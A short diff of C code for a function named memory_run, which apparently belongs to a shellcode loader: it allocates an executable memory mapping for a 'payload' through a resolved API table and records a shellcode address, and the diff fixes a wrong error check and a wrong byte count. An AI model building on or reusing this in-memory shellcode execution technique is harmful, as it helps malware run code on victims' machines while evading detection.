@@ -16,7 +16,7 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 	MemoryInfo memInfo = { 0 };
 
 	HANDLE hFile = g_ldr->apis->CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, PayloadSize, NULL);
-	if (hFile == INVALID_HANDLE_VALUE) {
+	if (hFile == NULL) {
 		memInfo.ok = FALSE;
 		memInfo.BytesWrote = 0;
 		return memInfo;
@@ -35,6 +35,6 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 
 	memInfo.ShellCodeAddress = Address;
 	memInfo.ok = TRUE;
-	memInfo.BytesWrote = PayloadAddress;
+	memInfo.BytesWrote = PayloadSize;
 	return memInfo;
 }
